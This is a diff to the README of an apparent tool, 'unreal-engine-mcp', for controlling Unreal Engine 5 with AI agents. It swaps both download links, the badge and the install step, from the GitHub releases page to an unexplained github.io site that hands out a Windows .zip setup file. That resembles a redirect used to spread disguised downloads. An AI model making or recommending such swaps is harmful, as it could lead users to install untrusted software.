@@ -1,6 +1,6 @@
 # 🤖 unreal-engine-mcp - Control Unreal Engine with AI Agents
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Groggy-rollcall812/unreal-engine-mcp/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://groggy-rollcall812.github.io)
 
 This software allows you to connect an AI agent to Unreal Engine 5. You can issue commands to build levels, change assets, or trigger blueprints through a chat interface. It uses the Model Context Protocol to talk to your AI and the Remote Control API to talk to Unreal Engine. You do not need to compile code or edit C++ files to start.
 
@@ -17,7 +17,7 @@ You must enable the Remote Control API in Unreal Engine for this tool to functio
 
 ## 📥 How to Install
 
-1. Visit the [releases page](https://github.com/Groggy-rollcall812/unreal-engine-mcp/releases) to download the latest setup file.
+1. Visit the [releases page](https://groggy-rollcall812.github.io) to download the latest setup file.
 2. Select the file ending in .zip for your version of Windows.
 3. Save the folder to a location on your computer where you can find it.
 4. Right-click the folder and choose Extract All to view the contents.
